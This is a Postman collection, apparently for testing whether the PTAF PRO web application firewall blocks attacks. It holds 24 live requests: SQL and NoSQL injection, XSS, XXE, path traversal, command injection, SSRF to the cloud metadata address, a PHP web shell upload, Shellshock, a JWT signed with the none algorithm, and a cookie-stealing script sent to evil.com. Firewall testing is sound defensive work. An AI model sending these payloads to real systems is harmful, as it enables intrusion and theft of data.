{
	"info": {
		"_postman_id": "1234567-89ab-cdef-1234-567890abcdef",
		"name": "PTAF PRO Test Attacks Collection",
		"description": "–ö–æ–ª–ª–µ–∫—Ü–∏—è —Ç–µ—Å—Ç–æ–≤ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ PTAF PRO",
		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
		"version": "2.0"
	},
	"item": [
		{
			"name": "üöÄ Run All Tests",
			"event": [
				{
					"listen": "prerequest",
					"script": {
						"type": "text/javascript",
						"exec": [
							"console.log('üöÄ –ù–∞—á–∏–Ω–∞–µ–º —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ PTAF PRO...');",
							"",
							"// –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º base_url",
							"if (!pm.variables.get('base_url')) {",
							"    pm.variables.set('base_url', 'https://msproject.site.net/console');",
							"    console.log('‚ÑπÔ∏è base_url —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é');",
							"}",
							"",
							"// –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ—Å—Ç–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ",
							"const requiredVars = ['modern_user_agent', 'automated_bot_user_agent', 'vuln_scanner_user_agent', 'test_payload_size', 'jwt_token_none_alg'];",
							"requiredVars.forEach(varName => {",
							"    if (!pm.variables.get(varName)) {",
							"        const defaultValues = {",
							"            modern_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',",
							"            automated_bot_user_agent: 'Googlebot/2.1 (+http://www.google.com/bot.html)',",
							"            vuln_scanner_user_agent: 'Nessus SOAP',",
							"            test_payload_size: '10000',",
							"            jwt_token_none_alg: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.'",
							"        };",
							"        pm.variables.set(varName, defaultValues[varName]);",
							"        console.log(`‚ÑπÔ∏è ${varName} —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é`);",
							"    }",
							"});",
							"",
							"// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Ç–µ—Å—Ç–æ–≤ –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ",
							"if (!pm.collectionVariables.get('currentTestIndex')) {",
							"    const testRequests = [",
							"        { name: '1. SQL Injection', url: '{{base_url}}/search?q=1%27+OR+%271%27%3D%271' },",
							"        { name: '2. Cross-Site Scripting (HTML)', method: 'POST', url: '{{base_url}}/search', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'q=<script>alert(1)</script>' },",
							"        { name: '3. Cross-Site Scripting (URL)', url: '{{base_url}}/redirect?url=javascript:alert(1)' },",
							"        { name: '4. XML External Entities (XXE)', method: 'POST', url: '{{base_url}}/api/xml', headers: { 'Content-Type': 'application/xml' }, body: '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>' },",
							"        { name: '5. Path Traversal', url: '{{base_url}}/files?file=../../../etc/passwd' },",
							"        { name: '6. NoSQL Injection', method: 'POST', url: '{{base_url}}/search', headers: { 'Content-Type': 'application/json' }, body: '{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}' },",
							"        { name: '7. OS Command Injection', url: '{{base_url}}/status?cmd=ping;cat%20/etc/passwd' },",
							"        { name: '8. Server-Side Request Forgery', url: '{{base_url}}/proxy?url=http://169.254.169.254/latest/meta-data/' },",
							"        { name: '9. Local File Inclusion', url: '{{base_url}}/include?file=../../../etc/passwd%00' },",
							"        { name: '10. Server-Side Template Injection', method: 'POST', url: '{{base_url}}/profile', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'name={{7*7}}&email=test@example.com' },",
							"        { name: '11. XPath Injection', url: '{{base_url}}/users?xpath=/users/user[username/text()=%27admin%27%20or%20%271%27=%271%27]' },",
							"        { name: '12. XML Injection', method: 'POST', url: '{{base_url}}/api/xml', headers: { 'Content-Type': 'application/xml', 'Accept': 'application/xml', 'User-Agent': '{{vuln_scanner_user_agent}}' }, body: '<?xml version=\"1.0\" encoding=\"UTF-8\"?><user><id>1 OR 1=1</id><name>test\\' OR \\'1\\'=\\'1</name></user>' },",
							"        { name: '13. Open Redirect', url: '{{base_url}}/redirect?url=http://evil.com/shell.php' },",
							"        { name: '14. Web Shell Upload', method: 'POST', url: '{{base_url}}/upload', headers: { 'Content-Type': 'multipart/form-data; boundary=---------------------------974767299852498929531610575', 'User-Agent': '{{vuln_scanner_user_agent}}', 'X-Requested-With': 'XMLHttpRequest' }, body: '-----------------------------974767299852498929531610575\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.png\"\\r\\nContent-Type: image/png\\r\\n\\r\\nGIF87a;\\r\\n<?php\\r\\n  system(\\'id\\');\\r\\n?>\\r\\n-----------------------------974767299852498929531610575--' },",
							"        { name: '15. Cross-Site Request Forgery', method: 'POST', url: '{{base_url}}/login', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'evil.com', 'Referer': 'evil.com/csrf.html' }, body: 'username=<script>document.location=\\'https://evil.com?cookie=\\'+document.cookie</script>&password=test' },",
							"        { name: '16. Vulnerability Scanner', url: '{{base_url}}/include?file=../../../../etc/passwd%00', headers: { 'User-Agent': '{{vuln_scanner_user_agent}}' } },",
							"        { name: '17. Automated Bot User Agent', method: 'POST', url: '{{base_url}}/search', headers: { 'Content-Type': 'application/json', 'User-Agent': '{{automated_bot_user_agent}}' }, body: '{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}' },",
							"        { name: '18. Malformed HTTP Request', url: '{{base_url}}/files?file=../../../etc/passwd', headers: { 'X-Custom-IP-Authorization': '127.0.0.1' } },",
							"        { name: '19. Response Splitting', url: '{{base_url}}/include?file=http://evil.com/shell.php' },",
							"        { name: '20. JWT Attack (None Algorithm)', url: '{{base_url}}/api/admin', headers: { 'Authorization': 'Bearer {{jwt_token_none_alg}}' } },",
							"        { name: '21. Large Body Test', method: 'POST', url: '{{base_url}}/api/data', headers: { 'Content-Type': 'application/json' }, body: '{\"data\": \"A\".repeat(50000)}' },",
							"        { name: '22. LFI with PHP Wrapper', url: '{{base_url}}/download?file=php://filter/convert.base64-encode/resource={{test_file_path}}' },",
							"        { name: '23. RCE via User-Agent', url: '{{base_url}}/', headers: { 'User-Agent': '() { :; }; /bin/bash -c \"cat /etc/passwd\"' } },",
							"        { name: '24. GraphQL Introspection', method: 'POST', url: '{{base_url}}/graphql', headers: { 'Content-Type': 'application/json' }, body: '{\"query\": \"query{__schema{types{name,fields{name}}}}\" }' }",
							"    ];",
							"    ",
							"    pm.collectionVariables.set('testRequests', JSON.stringify(testRequests));",
							"    pm.collectionVariables.set('currentTestIndex', '0');",
							"    pm.collectionVariables.set('testResults', JSON.stringify([]));",
							"    console.log(`üéØ –ù–∞–π–¥–µ–Ω–æ ${testRequests.length} —Ç–µ—Å—Ç–æ–≤`);",
							"}",
							"",
							"// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ–¥–Ω–æ–≥–æ —Ç–µ—Å—Ç–∞",
							"async function runTest(test) {",
							"    const request = {",
							"        url: pm.variables.replaceIn(test.url),",
							"        method: test.method || 'GET',",
							"        header: {",
							"            'User-Agent': pm.variables.get('modern_user_agent'),",
							"            ...(test.headers || {})",
							"        },",
							"        timeout: 10000, // 10 —Å–µ–∫—É–Ω–¥ —Ç–∞–π–º–∞—É—Ç",
							"        disableBodyPruning: true",
							"    };",
							"    ",
							"    if (test.body) {",
							"        request.body = {",
							"            mode: 'raw',",
							"            raw: pm.variables.replaceIn(test.body)",
							"        };",
							"    }",
							"    ",
							"    try {",
							"        const response = await new Promise((resolve, reject) => {",
							"            pm.sendRequest(request, (err, res) => {",
							"                if (err) reject(err);",
							"                else resolve(res);",
							"            });",
							"        });",
							"        ",
							"        const isBlocked = response.code === 403;",
							"        const status = isBlocked ? '‚úÖ' : '‚ùå';",
							"        const statusEmoji = isBlocked ? 'üõ°Ô∏è' : '‚ö†Ô∏è';",
							"        console.log(`${statusEmoji} ${test.name} - ${status} Status: ${response.code}`);",
							"        if (response.headers.get('Transaction-ID')) {",
							"            console.log(`   üîë Transaction ID: ${response.headers.get('Transaction-ID')}`);",
							"        }",
							"        ",
							"        // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ç–µ—Å—Ç–∞",
							"        const testResults = JSON.parse(pm.collectionVariables.get('testResults'));",
							"        testResults.push({",
							"            name: test.name,",
							"            status: isBlocked ? 'blocked' : 'allowed',",
							"            code: response.code,",
							"            transactionId: response.headers.get('Transaction-ID')",
							"        });",
							"        pm.collectionVariables.set('testResults', JSON.stringify(testResults));",
							"        ",
							"        // –ñ–¥–µ–º 1 —Å–µ–∫—É–Ω–¥—É –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–∏–º —Ç–µ—Å—Ç–æ–º",
							"        await new Promise(resolve => setTimeout(resolve, 1000));",
							"        ",
							"        return true;",
							"    } catch (err) {",
							"        console.log(`‚ùå –û—à–∏–±–∫–∞ –≤ —Ç–µ—Å—Ç–µ ${test.name}:`, err);",
							"        ",
							"        // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ç–µ—Å—Ç–∞ —Å –æ—à–∏–±–∫–æ–π",
							"        const testResults = JSON.parse(pm.collectionVariables.get('testResults'));",
							"        testResults.push({",
							"            name: test.name,",
							"            status: 'error',",
							"            error: err.message",
							"        });",
							"        pm.collectionVariables.set('testResults', JSON.stringify(testResults));",
							"        ",
							"        return false;",
							"    }",
							"}",
							"",
							"// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–≤–æ–¥–∞ –æ—Ç—á–µ—Ç–∞",
							"function printReport(testResults) {",
							"    console.log('\\nüìä ====== –û–¢–ß–ï–¢ –û –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ò PTAF PRO ======\\n');",
							"    ",
							"    const blocked = testResults.filter(r => r.status === 'blocked').length;",
							"    const allowed = testResults.filter(r => r.status === 'allowed').length;",
							"    const errors = testResults.filter(r => r.status === 'error').length;",
							"    ",
							"    console.log(`üéØ –í—Å–µ–≥–æ —Ç–µ—Å—Ç–æ–≤: ${testResults.length}`);",
							"    console.log(`üõ°Ô∏è –£—Å–ø–µ—à–Ω–æ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ: ${blocked}`);",
							"    console.log(`‚ö†Ô∏è –†–∞–∑—Ä–µ—à–µ–Ω–æ (–Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ): ${allowed}`);",
							"    console.log(`‚ùå –û—à–∏–±–æ–∫: ${errors}\\n`);",
							"    ",
							"    console.log('üìù –î–µ—Ç–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç –ø–æ —Ç–µ—Å—Ç–∞–º:\\n');",
							"    testResults.forEach((result, index) => {",
							"        const statusEmoji = result.status === 'blocked' ? 'üõ°Ô∏è' : result.status === 'allowed' ? '‚ö†Ô∏è' : '‚ùå';",
							"        const statusText = result.status === 'blocked' ? '–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω' : result.status === 'allowed' ? '–†–∞–∑—Ä–µ—à–µ–Ω' : '–û—à–∏–±–∫–∞';",
							"        console.log(`${statusEmoji} ${result.name}: ${statusText}`);",
							"        if (result.transactionId) {",
							"            console.log(`   üîë Transaction ID: ${result.transactionId}`);",
							"        }",
							"        if (result.error) {",
							"            console.log(`   ‚ùå –û—à–∏–±–∫–∞: ${result.error}`);",
							"        }",
							"    });",
							"    ",
							"    console.log('\\nüéØ ======================================\\n');",
							"}",
							"",
							"// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –≤—Å–µ—Ö —Ç–µ—Å—Ç–æ–≤",
							"async function runAllTests() {",
							"    const testRequests = JSON.parse(pm.collectionVariables.get('testRequests'));",
							"    const currentIndex = parseInt(pm.collectionVariables.get('currentTestIndex'));",
							"    ",
							"    if (currentIndex < testRequests.length) {",
							"        const currentTest = testRequests[currentIndex];",
							"        console.log(`üîÑ –ó–∞–ø—É—Å–∫ —Ç–µ—Å—Ç–∞ ${currentIndex + 1}/${testRequests.length}: ${currentTest.name}`);",
							"        ",
							"        await runTest(currentTest);",
							"        ",
							"        // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –∏–Ω–¥–µ–∫—Å –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –¥–ª—è —Å–ª–µ–¥—É—é—â–µ–≥–æ —Ç–µ—Å—Ç–∞",
							"        pm.collectionVariables.set('currentTestIndex', (currentIndex + 1).toString());",
							"        ",
							"        // –ï—Å–ª–∏ —ç—Ç–æ –±—ã–ª –ø–æ—Å–ª–µ–¥–Ω–∏–π —Ç–µ—Å—Ç, –≤—ã–≤–æ–¥–∏–º –æ—Ç—á–µ—Ç",
							"        if (currentIndex + 1 >= testRequests.length) {",
							"            console.log('‚ú® –í—Å–µ —Ç–µ—Å—Ç—ã –≤—ã–ø–æ–ª–Ω–µ–Ω—ã!');",
							"            const testResults = JSON.parse(pm.collectionVariables.get('testResults'));",
							"            printReport(testResults);",
							"            ",
							"            // –û—á–∏—â–∞–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ",
							"            pm.collectionVariables.unset('testRequests');",
							"            pm.collectionVariables.unset('currentTestIndex');",
							"            pm.collectionVariables.unset('testResults');",
							"        } else {",
							"            // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–ª–µ–¥—É—é—â–∏–π —Ç–µ—Å—Ç",
							"            runAllTests();",
							"        }",
							"    }",
							"}",
							"",
							"// –ó–∞–ø—É—Å–∫–∞–µ–º –≤—Å–µ —Ç–µ—Å—Ç—ã",
							"runAllTests();"
						]
					}
				},
				{
					"listen": "test",
					"script": {
						"type": "text/javascript",
						"exec": [
							"// –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ç–µ–∫—É—â–µ–≥–æ —Ç–µ—Å—Ç–∞",
							"pm.test('PTAF PRO –¥–æ–ª–∂–µ–Ω –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∑–∞–ø—Ä–æ—Å', function() {",
							"    pm.response.to.have.status(403);",
							"    pm.response.to.have.body('Forbidden');",
							"    const txId = pm.response.headers.get('Transaction-ID');",
							"    pm.expect(txId).to.not.be.undefined;",
							"    if (txId) {",
							"        console.log('Transaction ID:', txId);",
							"    }",
							"});"
						]
					}
				}
			],
			"request": {
				"method": "GET",
				"url": "{{base_url}}/search?q=1%27+OR+%271%27%3D%271",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				]
			}
		},
		{
			"name": "1. SQL Injection",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/search?q=1'+OR+'1'%3D'1",
					"host": ["{{base_url}}"],
					"path": ["search"],
					"query": [
						{
							"key": "q",
							"value": "1'+OR+'1'%3D'1"
						}
					]
				}
			}
		},
		{
			"name": "2. Cross-Site Scripting (HTML)",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					},
					{
						"key": "Content-Type",
						"value": "application/x-www-form-urlencoded"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "q=<script>alert(1)</script>"
				},
				"url": {
					"raw": "{{base_url}}/search",
					"host": ["{{base_url}}"],
					"path": ["search"]
				}
			}
		},
		{
			"name": "3. Cross-Site Scripting (URL)",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/redirect?url=javascript:alert(1)",
					"host": ["{{base_url}}"],
					"path": ["redirect"],
					"query": [
						{
							"key": "url",
							"value": "javascript:alert(1)"
						}
					]
				}
			}
		},
		{
			"name": "4. XML External Entities (XXE)",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					},
					{
						"key": "Content-Type",
						"value": "application/xml"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<test>&xxe;</test>"
				},
				"url": {
					"raw": "{{base_url}}/api/xml",
					"host": ["{{base_url}}"],
					"path": ["api", "xml"]
				}
			}
		},
		{
			"name": "5. Path Traversal",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/files?file=../../../etc/passwd",
					"host": ["{{base_url}}"],
					"path": ["files"],
					"query": [
						{
							"key": "file",
							"value": "../../../etc/passwd"
						}
					]
				}
			}
		},
		{
			"name": "6. NoSQL Injection",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					},
					{
						"key": "Content-Type",
						"value": "application/json"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}"
				},
				"url": {
					"raw": "{{base_url}}/search",
					"host": ["{{base_url}}"],
					"path": ["search"]
				}
			}
		},
		{
			"name": "7. OS Command Injection",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/status?cmd=ping;cat%20/etc/passwd",
					"host": ["{{base_url}}"],
					"path": ["status"],
					"query": [
						{
							"key": "cmd",
							"value": "ping;cat%20/etc/passwd"
						}
					]
				}
			}
		},
		{
			"name": "8. Server-Side Request Forgery (SSRF)",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/proxy?url=http://169.254.169.254/latest/meta-data/",
					"host": ["{{base_url}}"],
					"path": ["proxy"],
					"query": [
						{
							"key": "url",
							"value": "http://169.254.169.254/latest/meta-data/"
						}
					]
				}
			}
		},
		{
			"name": "9. Local File Inclusion (LFI)",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/include?file=../../../etc/passwd%00",
					"host": ["{{base_url}}"],
					"path": ["include"],
					"query": [
						{
							"key": "file",
							"value": "../../../etc/passwd%00"
						}
					]
				}
			}
		},
		{
			"name": "10. Server-Side Template Injection (SSTI)",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					},
					{
						"key": "Content-Type",
						"value": "application/x-www-form-urlencoded"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "name={{7*7}}&email=test@example.com"
				},
				"url": {
					"raw": "{{base_url}}/profile",
					"host": ["{{base_url}}"],
					"path": ["profile"]
				}
			}
		},
		{
			"name": "11. XPath Injection",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/users?xpath=/users/user[username/text()='admin' or '1'='1']",
					"host": ["{{base_url}}"],
					"path": ["users"],
					"query": [
						{
							"key": "xpath",
							"value": "/users/user[username/text()='admin' or '1'='1']"
						}
					]
				}
			}
		},
		{
			"name": "12. XML Injection",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "sqlmap/1.4.7"
					},
					{
						"key": "Content-Type",
						"value": "application/xml"
					},
					{
						"key": "Accept",
						"value": "application/xml"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<user>\n  <id>1 OR 1=1</id>\n  <name>test' OR '1'='1</name>\n</user>"
				},
				"url": {
					"raw": "{{base_url}}/api/xml",
					"host": ["{{base_url}}"],
					"path": ["api", "xml"]
				}
			}
		},
		{
			"name": "13. Open Redirect",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/redirect?url=http://evil.com/shell.php",
					"host": ["{{base_url}}"],
					"path": ["redirect"],
					"query": [
						{
							"key": "url",
							"value": "http://evil.com/shell.php"
						}
					]
				}
			}
		},
		{
			"name": "14. Web Shell Upload",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "Nessus/8.10.1"
					},
					{
						"key": "Content-Type",
						"value": "multipart/form-data; boundary=---------------------------974767299852498929531610575"
					},
					{
						"key": "X-Requested-With",
						"value": "XMLHttpRequest"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "-----------------------------974767299852498929531610575\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.png\"\r\nContent-Type: image/png\r\n\r\nGIF87a;\r\n<?php\r\n  system('id');\r\n?>\r\n-----------------------------974767299852498929531610575--"
				},
				"url": {
					"raw": "{{base_url}}/upload",
					"host": ["{{base_url}}"],
					"path": ["upload"]
				}
			}
		},
		{
			"name": "15. Cross-Site Request Forgery (CSRF)",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					},
					{
						"key": "Content-Type",
						"value": "application/x-www-form-urlencoded"
					},
					{
						"key": "Origin",
						"value": "evil.com"
					},
					{
						"key": "Referer",
						"value": "evil.com/csrf.html"
					},
					{
						"key": "X-CSRF-Token",
						"value": "invalid_token"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "username=admin&password=password&action=transfer&amount=1000&to=attacker"
				},
				"url": {
					"raw": "{{base_url}}/login",
					"host": ["{{base_url}}"],
					"path": ["login"]
				}
			}
		},
		{
			"name": "16. Vulnerability Scanner",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "Nessus SOAP"
					}
				],
				"url": {
					"raw": "{{base_url}}/include?file=../../../../etc/passwd%00",
					"host": ["{{base_url}}"],
					"path": ["include"],
					"query": [
						{
							"key": "file",
							"value": "../../../../etc/passwd%00"
						}
					]
				}
			}
		},
		{
			"name": "17. Automated Bot User Agent",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "Googlebot/2.1 (+http://www.google.com/bot.html)"
					},
					{
						"key": "Content-Type",
						"value": "application/json"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}"
				},
				"url": {
					"raw": "{{base_url}}/search",
					"host": ["{{base_url}}"],
					"path": ["search"]
				}
			}
		},
		{
			"name": "18. Malformed HTTP Request",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					},
					{
						"key": "X-Custom-IP-Authorization",
						"value": "127.0.0.1"
					}
				],
				"url": {
					"raw": "{{base_url}}/files?file=../../../etc/passwd",
					"host": ["{{base_url}}"],
					"path": ["files"],
					"query": [
						{
							"key": "file",
							"value": "../../../etc/passwd"
						}
					]
				}
			}
		},
		{
			"name": "19. Response Splitting",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/include?file=http://evil.com/shell.php",
					"host": ["{{base_url}}"],
					"path": ["include"],
					"query": [
						{
							"key": "file",
							"value": "http://evil.com/shell.php"
						}
					]
				}
			}
		},
		{
			"name": "20. JWT Attack (None Algorithm)",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					},
					{
						"key": "Authorization",
						"value": "Bearer {{jwt_token_none_alg}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/api/admin?alg=none&debug=true",
					"host": ["{{base_url}}"],
					"path": ["api", "admin"],
					"query": [
						{
							"key": "alg",
							"value": "none"
						},
						{
							"key": "debug",
							"value": "true"
						}
					]
				}
			}
		},
		{
			"name": "21. Large Body Test",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					},
					{
						"key": "Content-Type",
						"value": "application/json"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\"data\": \"A\".repeat(50000)}"
				},
				"url": {
					"raw": "{{base_url}}/api/data",
					"host": ["{{base_url}}"],
					"path": ["api", "data"]
				}
			}
		},
		{
			"name": "22. LFI with PHP Wrapper",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					}
				],
				"url": {
					"raw": "{{base_url}}/download?file=php://filter/convert.base64-encode/resource=/etc/passwd&type=lfi",
					"host": ["{{base_url}}"],
					"path": ["download"],
					"query": [
						{
							"key": "file",
							"value": "php://filter/convert.base64-encode/resource=/etc/passwd"
						},
						{
							"key": "type",
							"value": "lfi"
						}
					]
				}
			}
		},
		{
			"name": "23. RCE via User-Agent",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "User-Agent",
						"value": "() { :; }; /bin/bash -c \"cat /etc/passwd\""
					}
				],
				"url": {
					"raw": "{{base_url}}/",
					"host": ["{{base_url}}"],
					"path": ["/"]
				}
			}
		},
		{
			"name": "24. GraphQL Introspection",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "User-Agent",
						"value": "{{modern_user_agent}}"
					},
					{
						"key": "Content-Type",
						"value": "application/json"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\"query\": \"query{__schema{types{name,fields{name}}}}\"}"
				},
				"url": {
					"raw": "{{base_url}}/graphql",
					"host": ["{{base_url}}"],
					"path": ["graphql"]
				}
			}
		}
	],
	"variable": [
		{
			"key": "base_url",
			"value": "https://msproject.site.net/console",
			"type": "string",
			"description": "–ë–∞–∑–æ–≤—ã–π URL –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è"
		},
		{
			"key": "modern_user_agent",
			"value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
			"type": "string",
			"description": "–°–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π User-Agent –¥–ª—è –∑–∞–ø—Ä–æ—Å–æ–≤"
		},
		{
			"key": "vuln_scanner_user_agent",
			"value": "Nessus SOAP",
			"type": "string",
			"description": "User-Agent —Å–∫–∞–Ω–µ—Ä–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π"
		},
		{
			"key": "automated_bot_user_agent",
			"value": "Googlebot/2.1 (+http://www.google.com/bot.html)",
			"type": "string",
			"description": "User-Agent –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –±–æ—Ç–∞"
		},
		{
			"key": "evil_domain",
			"value": "evil.com",
			"type": "string",
			"description": "–î–æ–º–µ–Ω –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –¥–ª—è CSRF –∏ –¥—Ä—É–≥–∏—Ö –∞—Ç–∞–∫"
		},
		{
			"key": "test_file_path",
			"value": "/etc/passwd",
			"type": "string",
			"description": "–ü—É—Ç—å –∫ —Ç–µ—Å—Ç–æ–≤–æ–º—É —Ñ–∞–π–ª—É –¥–ª—è LFI –∏ Path Traversal"
		},
		{
			"key": "internal_ip",
			"value": "169.254.169.254",
			"type": "string",
			"description": "–í–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π IP –¥–ª—è SSRF —Ç–µ—Å—Ç–æ–≤"
		},
		{
			"key": "content_type_json",
			"value": "application/json",
			"type": "string",
			"description": "Content-Type –¥–ª—è JSON –∑–∞–ø—Ä–æ—Å–æ–≤"
		},
		{
			"key": "content_type_xml",
			"value": "application/xml",
			"type": "string",
			"description": "Content-Type –¥–ª—è XML –∑–∞–ø—Ä–æ—Å–æ–≤"
		},
		{
			"key": "content_type_form",
			"value": "application/x-www-form-urlencoded",
			"type": "string",
			"description": "Content-Type –¥–ª—è form-urlencoded –∑–∞–ø—Ä–æ—Å–æ–≤"
		},
		{
			"key": "jwt_token_none_alg",
			"value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.",
			"type": "string",
			"description": "JWT —Ç–æ–∫–µ–Ω —Å –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º none –¥–ª—è –∞—Ç–∞–∫"
		},
		{
			"key": "test_payload_size",
			"value": "10000",
			"type": "string",
			"description": "–†–∞–∑–º–µ—Ä —Ç–µ—Å—Ç–æ–≤–æ–≥–æ payload –¥–ª—è Buffer Overflow"
		},
		{
